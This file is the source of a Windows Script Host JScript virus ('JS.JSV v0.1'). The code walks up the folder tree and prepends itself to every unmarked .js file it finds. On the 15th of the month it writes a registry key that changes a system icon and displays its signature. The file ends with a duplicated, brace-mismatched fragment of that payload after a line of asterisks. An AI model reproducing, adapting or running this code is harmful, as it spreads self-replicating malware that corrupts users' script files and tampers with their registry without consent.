// 1nternal

var FSO    = WScript.CreateObject("Scripting.FileSystemObject");
var cpath  = FSO.GetParentFolderName(WScript.ScriptFullName);
var fder   = FSO.GetFolder(cpath);
while (!fder.IsRootFolder)
{
	var fder = FSO.GetFolder(cpath);
	cpath = FSO.GetParentFolderName(cpath);
	var fc = new Enumerator(fder.files);
	for (; !fc.atEnd(); fc.moveNext())  {
		if (FSO.GetExtensionName(fc.item().name).toLowerCase() == "js")
		{
			var fv = FSO.OpenTextFile(fc.item().Path, 1, false);
			var TestString = fv.ReadLine();
			fv.Close();
			if (TestString != '// 1nternal')
			{
				var TempFile = FSO.GetTempName();
				FSO.CopyFile(fc.item(), TempFile);
				var fr = FSO.OpenTextFile(WScript.ScriptFullName, 1, false);
				var fw = FSO.OpenTextFile(fc.item(), 2, true);
				for (i = 0; i < 44; i++)
				fw.WriteLine(fr.ReadLine());
				fr.Close();
				fw.Close();
				var fr = FSO.OpenTextFile(TempFile, 1, false);
				var fw = FSO.OpenTextFile(fc.item(), 8, true);
				while(!fr.AtEndOfStream)
				fw.WriteLine(fr.ReadLine());
				fr.Close();
				fw.Close();
				FSO.DeleteFile(TempFile);
			}
		}
	}
}
var TodayD = new Date();
if (TodayD.getDate() == 15)
{
	var WSHell = WScript.CreateObject("WScript.Shell");
	WSHell.RegWrite("HKEY_USERS\\.DEFAULT\\Software\\Classes\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\DefaultIcon\\", "C:\\WINDOWS\\SYSTEM\\Pifmgr.dll,32");
	WScript.echo('JS.JSV v0.1 /1nternal');
}
*************************************************************************
	var WSHell = WScript.CreateObject("WScript.Shell");
	WSHell.RegWrite("HKEY_USERS\\.DEFAULT\\Software\\Classes\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\DefaultIcon\\", "C:\\WINDOWS\\SYSTEM\\Pifmgr.dll,32");
	WScript.echo('JS.JSV v0.1 /1nternal');
}
WScript.echo('JS.JSV v0.1 /1nternal');

